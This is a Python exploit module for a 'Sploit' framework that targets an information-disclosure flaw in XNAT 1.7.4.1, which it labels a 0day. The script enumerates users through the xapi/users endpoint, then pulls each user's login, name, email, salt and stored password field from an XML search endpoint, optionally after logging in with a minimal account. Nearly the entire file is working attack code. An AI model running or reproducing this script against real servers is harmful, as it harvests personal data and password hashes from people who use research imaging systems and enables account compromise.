#!/usr/bin/env python

import urllib2
import ssl
import cookielib
import xml.etree.ElementTree as ET
import pprint
import json
ssl._create_default_https_context = ssl._create_unverified_context


from collections import OrderedDict
from Sploit import Sploit


INFO = {}
INFO['NAME'] = 'efa_xnat_info_disclosure'
INFO['DESCRIPTION'] = 'XNAT info diclosure'
INFO['VENDOR'] = 'https://www.xnat.org/'
INFO['CVE Name'] = '0day'
INFO['DOWNLOAD_LINK'] = 'https://download.xnat.org/'
INFO['LINKS'] = []
INFO['CHANGELOG'] = '23 Apr 2018'
INFO['PATH'] = 'Web/'
INFO['NOTES'] = """Vulnerability allows remote attackers to obtain selected user's info. 
Authentication(with minimal rights) is required if "Require User Login" option enabled. 
Tested against XNAT 1.7.4.1 on Ubuntu 16.04 x86-64.
"""

OPTIONS = OrderedDict()
OPTIONS['HOST'] = '192.168.1.230'
OPTIONS['PORT'] = 80
OPTIONS['SSL'] = False
OPTIONS['VHOST'] = 'xnat'
OPTIONS['USERNAME'] = '', dict(description='Username if required')
OPTIONS['PASSWORD'] = '', dict(description='Password if required')


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', OPTIONS['HOST'])
        self.port = self.args.get('PORT', OPTIONS['PORT'])
        self.ssl = self.args.get('SSL', OPTIONS['SSL'])
        self.vhost = self.args.get('VHOST', OPTIONS['VHOST'])
        self.vhost = self.vhost.replace('\\', '/').strip('/')
        self.username = self.args.get('USERNAME', OPTIONS['USERNAME'])
        self.password = self.args.get('PASSWORD', OPTIONS['PASSWORD'])

    def make_url(self, path=''):
        proto = 'https' if self.ssl else 'http'
        url = '%s://%s:%s' % (proto, self.host, self.port)
        uri = '/'.join(s.replace('\\', '/').strip('/') for s in [self.vhost, path] if s)
        url = url + '/' + uri if uri else url
        return url
    
    def login(self):
        self.log('[*] Trying to login')            
        url = self.make_url('login')
        data = "username=%s&password=%s&login=" % (self.username, self.password)
        self.opener.open(url, data)
    
    def parse_xml_data(self, data):
        res = {}
        namespaces = {'xdat': 'http://nrg.wustl.edu/security'}
        # tree1 = minidom.parseString(data)
        tree = ET.fromstring(data)
        attrs = tree.attrib
        res['enabled'] = attrs.get('enabled')
        res['verified'] = attrs.get('verified')
        res['salt'] = attrs.get('salt')
        fields = ['login', 'firstname', 'lastname', 'email', 'primary_password']
        for field in fields:
            el = tree.find('xdat:' + field, namespaces)
            res[field] = el.text
        return res
        
    
    def recieve_users_info(self):
        res = self.opener.open(self.make_url('xapi/users')).read()
        data = json.loads(res)
        to_ret = []
        for user in data:
            url = self.make_url('app/action/XDATActionRouter/xdataction/xml/search_element/'
                                'xdat:user/search_field/xdat:user.login/search_value/%s/popup/true' % user)
            res = self.opener.open(url).read()
            res = self.parse_xml_data(res)
            to_ret.append(res)
        return to_ret

    def run(self):
        #Get options from gui
        self.args()
        cookie = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))
        self.opener = opener
        url = self.make_url()
        self.log('[*] Checking connection to %s' % url)
        res = opener.open(url)
        if self.username and self.password:
            self.login()
        self.log('[*] Trying to obtain users info')
        res = self.recieve_users_info()
        self.log('[+]\r\n' + pprint.pformat(res))
        self.finish(True)


if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()